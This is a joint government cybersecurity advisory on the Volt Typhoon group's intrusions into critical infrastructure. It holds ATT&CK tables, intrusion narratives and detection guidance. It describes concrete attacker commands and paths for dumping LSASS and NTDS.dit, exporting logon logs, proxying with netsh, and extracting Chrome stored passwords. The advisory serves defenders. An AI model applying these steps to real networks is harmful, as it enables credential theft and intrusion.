Volt Typhoon has strategically targeted network administrator web browser data, focusing on both browsing history and stored credentials.


OS Credential Dumping: LSASS Memory
T1003.001
Volt Typhoon used a DLL with MiniDump and the process ID of Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory and obtain credentials.


OS Credential Dumping: NTDS
T1003.003
Volt Typhoon appears to prioritize obtaining valid credentials by extracting the Active Directory database file (NTDS.dit).


Unsecured Credentials
T1552
Volt Typhoon has obtained credentials insecurely stored on an appliance.


Unsecured Credentials: Private Keys
T1552.004
Volt Typhoon has accessed a Local State file that contains the Advanced Encryption Standard (AES) encryption key used to encrypt the passwords stored in the Chrome browser, which enables the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.




Table 13: Volt Typhoon actors ATT&CK Techniques for Enterprise – Discovery


Discovery
 
 


Technique Title
ID
Use




Account Discovery: Local Account
T1087.001
Volt Typhoon executed net user and quser for user account information.


Application Window Discovery
T1010
Volt Typhoon created and accessed a file named rult3uil.log on a Domain Controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.


Browser Information Discovery
T1217
Volt Typhoon has installed browsers saved passwords history, credit card details, and cookies.


File and Directory Discovery
T1083
Volt Typhoon enumerated several directories​, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings.


Log Enumeration
T1654
Volt Typhoon has captured successful logon events.


Network Service Discovery
T1046
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


Peripheral Device Discovery
T1120
Volt Typhoon has obtained the victim's system screen dimension and display devices information.


Permission Groups Discovery
T1069
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


Process Discovery
T1057
Volt Typhoon executed tasklist /v to gather a detailed process listing.


Query Registry
T1012
Volt Typhoon has interacted with a PuTTY application by enumerating existing stored sessions.


Software Discovery
T1518
Volt Typhoon has obtained the victim's list of applications installed on the victim's system.


System Information Discovery
T1082
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


System Location Discovery
T1614
Volt Typhoon has obtained the victim's system current locale.


System Network Configuration Discovery: Internet Connection Discovery
T1016.001
Volt Typhoon employs ping with various IP addresses to check network connectivity and net start to list running services.


System Owner/User Discovery
T1033
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


System Service Discovery
T1007
Volt Typhoon employs ping with various IP addresses to check network connectivity and net start to list running services.


System Time Discovery
T1124
Volt Typhoon has obtained the victim's system timezone.




Table 14: Volt Typhoon actors ATT&CK Techniques for Enterprise – Lateral Movement


Lateral Movement
 
 


Technique Title
ID
Use




Remote Service Session Hijacking
T1563
Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, operational technology systems, and network security devices. This would enable them to access these critical systems.


Remote Services: Cloud Services
T1021.007
During the period of Volt Typhoon’s known network presence, there were anomalous login attempts to an Azure tenant potentially using credentials previously compromised from theft of NTDS.dit.


Remote Services: Remote Desktop Protocol
T1021.001
Volt Typhoon has moved laterally to the Domain Controller via an interactive RDP session using a compromised account with domain administrator privileges.


Use Alternate Authentication Material
T1550
Volt Typhoon may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement.


Valid Accounts: Cloud Accounts
T1078.004
During the period of Volt Typhoon’s known network presence, there were anomalous login attempts to an Azure tenant potentially using credentials previously compromised from theft of NTDS.dit.




Table 15: Volt Typhoon actors ATT&CK Techniques for Enterprise – Collection


Collection
 
 


Technique Title
ID
Use




Archive Collected Data
T1560
Volt Typhoon collected sensitive information obtained from a file server in multiple zipped files.


Archive Collected Data: Archive via Utility
T1560.001
Volt Typhoon has compressed and archived the extracted ntds.dit and accompanying registry files (by executing ronf.exe, which was likely a renamed version of rar.exe).


Data Staged
T1074
Volt Typhoon accessed the file C:\Users\{redacted}\Downloads\History.zip, which presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration.


Screen Capture
T1113
Volt Typhoon has obtained a screenshot of the victim's system using two libraries (gdi32.dll and gdiplus.dll)




Table 16: Volt Typhoon actors ATT&CK Techniques for Enterprise – Command and Control


Command and Control
 
 


Technique Title
ID
Use




Encrypted Channel
T1573
Volt Typhoon has setup FRP clients on a victim’s corporate infrastructure to establish covert communications channels for command and control.


Ingress Tool Transfer
T1105
Volt Typhoon uses legitimate, but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded an outdated version of comsvcs.dll, on the DC in a non-standard folder.


Proxy
T1090
Volt Typhoon has setup FRP clients on a victim’s corporate infrastructure to establish covert communications channels for command and control.


Proxy: Internal Proxy
T1090.001
Volt Typhoon has used the netsh command, a legitimate Windows command, to create a PortProxy registry modification on the PRTG server.


Proxy: Multi-hop Proxy
T1090.003
Volt Typhoon uses multi-hop proxies for command-and-control infrastructure.




Table 17: Volt Typhoon actors ATT&CK Techniques for Enterprise – Exfiltration


Exfiltration
 
 




Technique Title
ID
Use


Exfiltration Over Alternative Protocol
T1048
Volt Typhoon exfiltrated files via Server Message Block (SMB).









This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'TA0008', 'T1083', 'T1654', 'T1078.004', 'TA0010', 'T1552', 'T1593', 'T1059.004', 'TA0005', 'T1070.009', 'T1560', 'T1573', 'T1594', 'T1021.007', 'T1016', 'T1584.004', 'T1584.005', 'T1190', 'T1068', 'T1010', 'T1560.001', 'T1110.002', 'T1003.001', 'T1105', 'T1036.005', 'T1082', 'T1087.001', 'T1112', 'TA0043', 'T1069', 'T1590', 'T1217', 'T1113', 'T1090.001', 'T1550', 'T1588.005', 'T1078', 'T1563', 'T1555', 'T1070.004', 'T1090', 'T1552.004', 'TA0001', 'T1046', 'T1007', 'T1057', 'T1583.003', 'T1133', 'T1218', 'T1012', 'T1518', 'T1059.001', 'T1033', 'T1027.002', 'T1059', 'T1614', 'T1074', 'T1003.003', 'T1016.001', 'T1021.001', 'TA0009', 'T1587.004', 'T1047', 'T1592', 'T1124', 'T1006', 'T1589', 'T1070.001', 'T1120', 'T1555.003', 'T1048', 'T1591', 'T1090.003', 'T1589.002'}","






Actions to take today to mitigate Volt Typhoon activity:




Apply patches for internet-facing systems. Prioritize patching critical vulnerabilities in appliances known to be frequently exploited by Volt Typhoon.
Implement phishing-resistant MFA.
Ensure logging is turned on for application, access, and security logs and store logs in a central system.
Plan “end of life” for technology beyond manufacturer’s supported lifecycle.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China (PRC) state-sponsored cyber actors are seeking to pre-position themselves on IT networks for disruptive or destructive cyberattacks against U.S. critical infrastructure in the event of a major crisis or conflict with the United States.
CISA, NSA, FBI and the following partners are releasing this advisory to warn critical infrastructure organizations about this assessment, which is based on observations from the U.S. authoring agencies’ incident response activities at critical infrastructure organizations compromised by the PRC state-sponsored cyber group known as Volt Typhoon (also known as Vanguard Panda, BRONZE SILHOUETTE, Dev-0391, UNC3236, Voltzite, and Insidious Taurus):

U.S. Department of Energy (DOE)
U.S. Environmental Protection Agency (EPA)
U.S. Transportation Security Administration (TSA)
Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS), a part of the Communications Security Establishment (CSE)
United Kingdom National Cyber Security Centre (NCSC-UK)
New Zealand National Cyber Security Centre (NCSC-NZ)

The U.S. authoring agencies have confirmed that Volt Typhoon has compromised the IT environments of multiple critical infrastructure organizations—primarily in Communications, Energy, Transportation Systems, and Water and Wastewater Systems Sectors—in the continental and non-continental United States and its territories, including Guam. Volt Typhoon’s choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable lateral movement to OT assets to disrupt functions. The U.S. authoring agencies are concerned about the potential for these actors to use their network access for disruptive effects in the event of potential geopolitical tensions and/or military conflicts. CCCS assesses that the direct threat to Canada’s critical infrastructure from PRC state-sponsored actors is likely lower than that to U.S. infrastructure, but should U.S. infrastructure be disrupted, Canada would likely be affected as well, due to cross-border integration. ASD’s ACSC and NCSC-NZ assess Australian and New Zealand critical infrastructure, respectively, could be vulnerable to similar activity from PRC state-sponsored actors.
As the authoring agencies have previously highlighted, the use of living off the land (LOTL) techniques is a hallmark of Volt Typhoon actors’ malicious cyber activity when targeting critical infrastructure. The group also relies on valid accounts and leverage strong operational security, which combined, allows for long-term undiscovered persistence. In fact, the U.S. authoring agencies have recently observed indications of Volt Typhoon actors maintaining access and footholds within some victim IT environments for at least five years. Volt Typhoon actors conduct extensive pre-exploitation reconnaissance to learn about the target organization and its environment; tailor their tactics, techniques, and procedures (TTPs) to the victim’s environment; and dedicate ongoing resources to maintaining persistence and understanding the target environment over time, even after initial compromise.
The authoring agencies urge critical infrastructure organizations to apply the mitigations in this advisory and to hunt for similar malicious activity using the guidance herein provided, along with the recommendations found in joint guide Identifying and Mitigating Living Off the Land Techniques. These mitigations are primarily intended for IT and OT administrators in critical infrastructure organizations. Following the mitigations for prevention of or in response to an incident will help disrupt Volt Typhoon’s accesses and reduce the threat to critical infrastructure entities.
If activity is identified, the authoring agencies strongly recommend that critical infrastructure organizations apply the incident response recommendations in this advisory and report the incident to the relevant agency (see Contact Information section).
For additional information, see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection and U.S. Department of Justice (DOJ) press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report:


AA24-038A PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
(PDF,       1.56 MB
  )


Read the accompanying Malware Analysis Report: MAR-10448362-1.v1 Volt Typhoon.
For a downloadable copy of indicators of compromise (IOCs), see:


MAR-10448362.c1.v2.CLEAR_stix2.json
(JSON,       51.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See Appendix C: MITRE ATT&CK Tactics and Techniques section for tables of the Volt Typhoon cyber threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview of Activity
In May 2023, the authoring agencies—working with industry partners—disclosed information about activity attributed to Volt Typhoon (see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection). Since then, CISA, NSA, and FBI have determined that this activity is part of a broader campaign in which Volt Typhoon actors have successfully infiltrated the networks of critical infrastructure organizations in the continental and non-continental United States and its territories, including Guam.
The U.S. authoring agencies have primarily observed compromises linked to Volt Typhoon in Communications, Energy, Transportation Systems, and Water and Wastewater Systems sector organizations’ IT networks. Some victims are smaller organizations with limited cybersecurity capabilities that provide critical services to larger organizations or key geographic locations.
Volt Typhoon actors tailor their TTPs to the victim environment; however, the U.S. authoring agencies have observed the actors typically following the same pattern of behavior across identified intrusions. Their choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable the disruption of OT functions across multiple critical infrastructure sectors (see Figure 1).

Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network architecture and operational protocols. This reconnaissance includes identifying network topologies, security measures, typical user behaviors, and key network and IT staff. The intelligence gathered by Volt Typhoon actors is likely leveraged to enhance their operational security. For example, in some instances, Volt Typhoon actors may have abstained from using compromised credentials outside of normal working hours to avoid triggering security alerts on abnormal account activities.
Volt Typhoon typically gains initial access to the IT network by exploiting known or zero-day vulnerabilities in public-facing network appliances (e.g., routers, virtual private networks,VPNs, and firewalls) and then connects to the victim’s network via VPN for follow-on activities.
Volt Typhoon aims to obtain administrator credentials within the network, often by exploiting privilege escalation vulnerabilities in the operating system or network services. In some cases, Volt Typhoon has obtained credentials insecurely stored on a public-facing network appliance.
Volt Typhoon uses valid administrator credentials to move laterally to the domain controller (DC) and other devices via remote access services such as Remote Desktop Protocol (RDP).
Volt Typhoon conducts discovery in the victim’s network, leveraging LOTL binaries for stealth. A key tactic includes using PowerShell to perform targeted queries on Windows event logs, focusing on specific users and periods. These queries facilitate the discreet extraction of security event logs into .dat files, allowing Volt Typhoon actors to gather critical information while minimizing detection. This strategy, blending in-depth pre-compromise reconnaissance with meticulous post-exploitation intelligence collection, underscores their sophisticated and strategic approach to cyber operations.
Volt Typhoon achieves full domain compromise by extracting the Active Directory database (NTDS.dit) from the DC. Volt Typhoon frequently employs the Volume Shadow Copy Service (VSS) using command-line utilities such as vssadmin to access NTDS.dit. The NTDS.dit file is a centralized repository that contains critical Active Directory data, including user accounts, passwords (in hashed form), and other sensitive data, which can be leveraged for further exploitation. This method entails the creation of a shadow copy—a point-in-time snapshot—of the volume hosting the NTDS.dit file. By leveraging this snapshot, Volt Typhoon actors effectively bypass the file locking mechanisms inherent in a live Windows environment, which typically prevent direct access to the NTDS.dit file while the domain controller is operational.
Volt Typhoon likely uses offline password cracking techniques to decipher these hashes. This process involves extracting the hashes from the NTDS.dit file and then applying various password cracking methods, such as brute force attacks, dictionary attacks, or more sophisticated techniques like rainbow tables to uncover the plaintext passwords. The successful decryption of these passwords allows Volt Typhoon actors to obtain elevated access and further infiltrate and manipulate the network.
Volt Typhoon uses elevated credentials for strategic network infiltration and additional discovery, often focusing on gaining capabilities to access OT assets. Volt Typhoon actors have been observed testing access to domain-joint OT assets using default OT vendor credentials, and in certain instances, they have possessed the capability to access OT systems whose credentials were compromised via NTDS.dit theft. This access enables potential disruptions, such as manipulating heating, ventilation, and air conditioning (HVAC) systems in server rooms or disrupting critical energy and water controls, leading to significant infrastructure failures (in some cases, Volt Typhoon actors had the capability to access camera surveillance systems at critical infrastructure facilities). In one confirmed compromise, Volt Typhoon actors moved laterally to a control system and were positioned to move to a second control system.


 

Figure 1: Typical Volt Typhoon Activity

After successfully gaining access to legitimate accounts, Volt Typhoon actors exhibit minimal activity within the compromised environment (except discovery as noted above), suggesting their objective is to maintain persistence rather than immediate exploitation. This assessment is supported by observed patterns where Volt Typhoon methodically re-targets the same organizations over extended periods, often spanning several years, to continuously validate and potentially enhance their unauthorized accesses. Evidence of their meticulous approach is seen in instances where they repeatedly exfiltrate domain credentials, ensuring access to current and valid accounts. For example, in one compromise, Volt Typhoon likely extracted NTDS.dit from three domain controllers in a four-year period. In another compromise, Volt Typhoon actors extracted NTDS.dit two times from a victim in a nine-month period.
Industry reporting—identifying that Volt Typhoon actors are silent on the network following credential dumping and perform discovery to learn about the environment, but do not exfiltrate data—is consistent with the U.S. authoring agencies’ observations. This indicates their aim is to achieve and maintain persistence on the network. In one confirmed compromise, an industry partner observed Volt Typhoon actors dumping credentials at regular intervals.
In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid leaving malware artifacts on systems that would cause alerts. Their strong focus on stealth and operational security allows them to maintain long-term, undiscovered persistence. Further, Volt Typhoon’s operational security is enhanced by targeted log deletion to conceal their actions within the compromised environment.
See the below sections for Volt Typhoon TTPs observed by the U.S. authoring agencies from multiple confirmed Volt Typhoon compromises.
Observed TTPs
Reconnaissance
Volt Typhoon actors conduct extensive pre-compromise reconnaissance, to learn about the target organization, its network, and its staff,. This includes web searches,—including victim-owned sites,—for victim host, identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA,1, Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff, post compromise.
Resource Development
Historically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure,. The proxy is typically composed of virtual private servers (VPSs), or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations,. (See DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure for more information).
Initial Access
To obtain initial access, Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco,. They often use publicly available exploit code for known vulnerabilities, but are also adept at discovering and exploiting zero-day vulnerabilities,.

In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs.

Once initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access,. They often use VPN sessions to securely connect to victim environments, enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection.
Execution
Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line, and other native tools and processes on systems, (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some “commands appear to be exploratory or experimental, as the operators,i.e., malicious actors, adjust and repeat them multiple times.”,2,
For more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity.
Similar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded, an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory, and obtain credentials (LSASS process memory space contains hashes for the current user’s operating system (OS) credentials).
The actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.,3, (See the Command and Control section).
Persistence
Volt Typhoon primarily relies on valid credentials for persistence,.
Defense Evasion
Volt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion, which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques.
Volt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX),. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols—including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information.
In addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs, system logs, and other technical artifacts to remove evidence, of their intrusion activity and masquerading file names,.
Credential Access
Volt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities, in the operating system or network services. In some cases, they have obtained credentials insecurely stored on the appliance,. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device.
Volt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)—in some cases multiple times from the same victim over long periods,. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline.
To obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon:

Move laterally, to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges,;
Execute the Windows-native vssadmin, command to create a volume shadow copy;
Use Windows Management Instrumentation Console (WMIC) commands, to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and
Exfiltrate, NTDS.dit and SYSTEM registry hive to crack passwords offline),. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.)Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file.

Volt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions,. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section).
According to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).,2,
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.,2,

Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it.
Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks—as well as remote service execution.

Discovery
Volt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user, discovery.
Volt Typhoon uses at least the following LOTL tools and commands for system information, network service, group, and user discovery techniques:

Some observed specific examples of discovery include:

Capturing successful logon events,.

Specifically, in one incident, analysis of the PowerShell console history of a domain controller indicated that security event logs were directed to a file named user.dat, as evidenced by the executed command Get-EventLog security -instanceid 4624 -after,year-month-date, | fl * | Out-File 'C:\users\public\documents\user.dat'. This indicates the group's specific interest in capturing successful logon events (event ID 4624) to analyze user authentication patterns within the network. Additionally, file system analysis, specifically of the Master File Table (MFT), uncovered evidence of a separate file, systeminfo.dat, which was created in C:\Users\Public\Documents but subsequently deleted,. The presence of these activities suggests a methodical approach by Volt Typhoon actors in collecting and then possibly removing traces of sensitive log information from the compromised system.


Executing tasklist /v to gather a detailed process listing, followed by executing taskkill /f /im rdpservice.exe (the function of this executable is not known).
Executing net user and quser for user account information,.
Creating and accessing a file named rult3uil.log on a domain controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information, and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.
Employing ping with various IP addresses to check network connectivity, and net start to list running services,.

See Appendix A for additional LOTL examples.
In one confirmed compromise, Volt Typhoon actors attempted to use Advanced IP Scanner, which was on the network for admin use, to scan the network.
Volt Typhoon actors have been observed strategically targeting network administrator web browser data—focusing on both browsing history and stored credentials,—to facilitate targeting of personal email addresses (see the Reconnaissance section) for further discovery and possible network modifications that may impact the threat actor’s persistence within victim networks.
In one confirmed compromise:

Volt Typhoon actors obtained the history file from the User Data directory of a network administrator user’s Chrome browser. To obtain the history file, Volt Typhoon actors first executed an RDP session to the user’s workstation where they initially attempted, and failed, to obtain the C$ File Name: users\{redacted}\appdata\local\Google\Chrome\UserData\default\History file, as evidenced by the accompanying 1016 (reopen failed) SMB error listed in the application event log. The threat actors then disconnected the RDP session to the workstation and accessed the file C:\Users\{redacted}\Downloads\History.zip. This file presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration,. Shortly after accessing the history.zip file, the actors terminated RDP sessions.
About four months later, Volt Typhoon actors accessed the same user’s Chrome data C$ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Local State and $ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Default\Login Data via SMB. The Local State file contains the Advanced Encryption Standard (AES) encryption key, used to encrypt the passwords stored in the Chrome browser, which would enable the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.

In another confirmed compromise, Volt Typhoon actors accessed directories containing Chrome and Edge user data on multiple systems. Directory interaction was observed over the network to paths such as C:\Users\{redacted}\AppData\Local\Google\Chrome\User Data\ and C:\Users\{redacted}\AppData\Local\Microsoft\Edge\User Data\. They also enumerated several directories, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings,.
Lateral Movement
For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement,.
In one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections).
Volt Typhoon’s movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this information, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems,. See Figure 2.

 

Figure 2: Volt Typhoon Lateral Movement Path File Server, DC, and OT-Adjacent Assets

Additionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag.
Volt Typhoon actors may have attempted to move laterally to a cloud environment in one victim’s network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant, potentially using credentials, previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from non-associated IP addresses, with no definitive link to Volt Typhoon.
Collection and Exfiltration
The U.S. authoring agencies assess Volt Typhoon primarily collects information that would facilitate follow-on actions with physical impacts. For example, in one confirmed compromise, they collected, sensitive information obtained from a file server in multiple zipped files, and likely exfiltrated, the files via Server Message Block (SMB), (see Figure 3). Collected information included diagrams and documentation related to OT equipment, including supervisory control and data acquisition (SCADA) systems, relays, and switchgear. This data is crucial for understanding and potentially impacting critical infrastructure systems, indicating a focus on gathering intelligence that could be leveraged in actions targeting physical assets and systems.

 

Figure 3: Volt Typhoon Attack Path for Exfiltration of Data from File Server

In another compromise, Volt Typhoon actors leveraged WMIC to create and use temporary directories (C:\Users\Public\pro, C:\Windows\Temp\tmp, C:\Windows\Temp\tmp\Active Directory and C:\Windows\Temp\tmp\registry) to stage the extracted ntds.dit and SYSTEM registry hives from ntdsutil execution volume shadow copies (see the Credential Access section) obtained from two DCs. They then compressed and archived the extracted ntds.dit and accompanying registry files by executing ronf.exe, which was likely a renamed version of the archive utility rar.exe),.
Command and Control
Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure).
They have also been observed setting up FRP clients, on a victim’s corporate infrastructure to establish covert communications channels, for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell, open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has additional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT),. It also contains multiplexer libraries that can bi-directionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh),. See Appendix C and MAR-10448362-1.v1 for more information.
In the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification, on the PRTG server,. This key alteration redirected specific port traffic to Volt Typhoon’s proxy infrastructure, effectively converting the PRTG’s server into a proxy for their C2 traffic, (see Appendix B for details).
DETECTION/HUNT RECOMMENDATIONS
Apply Living off the Land Detection Best Practices
Apply the prioritized detection and hardening best practice recommendations provided in joint guide Identifying and Mitigating Living off the Land Techniques. Many organizations lack security and network management best practices (such as established baselines) that support detection of malicious LOTL activity—this makes it difficult for network defenders to discern legitimate behavior from malicious behavior and conduct behavior analytics, anomaly detection, and proactive hunting. Conventional IOCs associated with the malicious activity are generally lacking, complicating network defenders’ efforts to identify, track, and categorize this sort of malicious behavior. This advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques.
Review Application, Security, and System Event Logs
Routinely review application, security, and system event logs, focusing on Windows Extensible Storage Engine Technology (ESENT) Application Logs. Due to Volt Typhoon’s ability for long-term undetected persistence, network defenders should assume significant dwell time and review specific application event log IDs, which remain on endpoints for longer periods compared to security event logs and other ephemeral artifacts. Focus on Windows ESENT logs because certain ESENT Application Log event IDs (216, 325, 326, and 327) may indicate actors copying NTDS.dit.
See Table 1 for examples of ESENT and other key log indicators that should be investigated. Please note that incidents may not always have exact matches listed in the Event Detail column due to variations in event logging and TTPs.

Monitor and Review OT System Logs

Review access logs for communication paths between IT and OT networks, looking for anomalous accesses or protocols.
Measure the baseline of normal operations and network traffic for the industrial control system (ICS) and assess traffic anomalies for malicious activity.
Configure intrusion detection systems (IDS) to create alarms for any ICS network traffic outside normal operations.
Track and monitor audit trails on critical areas of ICS.
